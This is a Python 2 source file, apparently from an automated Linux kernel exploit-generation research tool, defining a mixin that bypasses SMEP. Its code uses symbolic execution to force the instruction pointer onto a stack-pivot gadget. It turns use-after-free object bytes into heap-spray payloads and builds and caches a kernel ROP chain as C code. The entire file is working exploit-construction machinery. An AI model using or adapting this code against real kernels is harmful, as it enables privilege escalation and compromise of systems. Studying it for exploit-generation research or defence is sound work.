# author: ww9210
import time
import kernelrop
import os
import pickle


class SMEPBypassMixin:
    def add_stack_pivot_constraint(self, state):
        if self.stack_pivot_address is None:
            raw_input('[-] no rop available')

        print '[+] checking the possibilities of stack pivot...'
        s = state.copy()
        primitive = {'state': s, 'timestamp': time.time(), 'address': s.history.bbl_addrs[-1]}
        if s.history.bbl_addrs[-1] not in self.seen_control_flow_hijack_primitive:
            self.seen_control_flow_hijack_primitive.append(s.history.bbl_addrs[-1])
            self.control_flow_hijack_primitive.append(primitive)  # add current state to CF hijack primitive
            is_new_primitive = True
        else:
            is_new_primitive = False
        # s.add_constraints(s.regs.rip == 0xdeadbeeffacefbad)
        s.add_constraints(s.regs.rip == self.stack_pivot_address)
        print s.solver.constraints
        self.dump_state_path_history(s)
        for _ in s.actions:
            print _
        if s.satisfiable() and is_new_primitive:
            # concretize uaf_bytes
            spray_content = ''
            for symbolic_byte in self.uaf_bytes:
                spray_content += s.solver.eval(symbolic_byte, cast_to=str)
            if self.dump_uaf_buffer:
                file('uaf_object_v2.bin', 'w').write(spray_content)

            uaf_buf = s.memory.load(self.uaf_object_base, self.uaf_object_size, inspect=False)
            userspace_buf = s.memory.load(self.userspace_base, 4096 * self.num_user_pages, inspect=False)
            con1 = s.solver.eval(uaf_buf, cast_to=str)
            # generate spray function
            self.pack_spray_payload(con1, self.spray_method)  # generate spray payload
            print 'the UAF object:', con1.encode('hex')
            if self.dump_uaf_buffer:
                file('uaf_object.bin', 'w').write(con1)
                print('[+] uaf object dumped to file')
            con2 = s.solver.eval(userspace_buf, cast_to=str)
            code, idx = self.pack_userspace_base_payload(con2)  # generate userspace base payload
            print 'the userspace_buf:', con2.encode('hex')
            if self.dump_userspace_buffer:
                file('userspace_buffer.bin', 'w').write(con2)
                print '[+] userspace buffer dumped to file.'
            if idx != -1:
                path_log = 'path_log_'+str(idx)+'.txt'
            else:
                path_log = 'path_log.txt'
            with open(path_log, 'w') as f:
                for _ in s.history_iterator:
                    f.write(str(_))
                    f.write('\n')
        return s

    def prepare_krop_payload(self, cmd=None, register_storing_ip='eax'):
        if not os.path.isfile('rop_payload.cache'):  # have not generate rop payload
            if cmd is None:
                cmd = ('--binary ' + self.kernel_path + ' --depth 5').split()
            self.krop = kernelrop.KernelROP(self.kernel_path, cmd)
            print('[+] calculating kernel ROP payload, it may take up to 5 minutes')
            selected_gadget_idx, c_code, core = self.krop.routine1_to_c_code(register_storing_ip=register_storing_ip)
            stack_pivot_addr = self.krop.stack_pivot_gadgets_ready_to_use[selected_gadget_idx]['stack_addr']
            res = [c_code, stack_pivot_addr, selected_gadget_idx]
            with open('rop_payload.cache', 'wb') as f:
                pickle.dump(res, f, -1)
        else:
            with open('rop_payload.cache', 'rb') as f:
                res = pickle.load(f)
                c_code = res[0]
                stack_pivot_addr = res[1]
                selected_gadget_idx = res[2]
        print 'writing rop payload to file'
        file('rop_payload.c', 'w').write(c_code)
        print 'stack_pivot_addr:', hex(stack_pivot_addr)

        return stack_pivot_addr
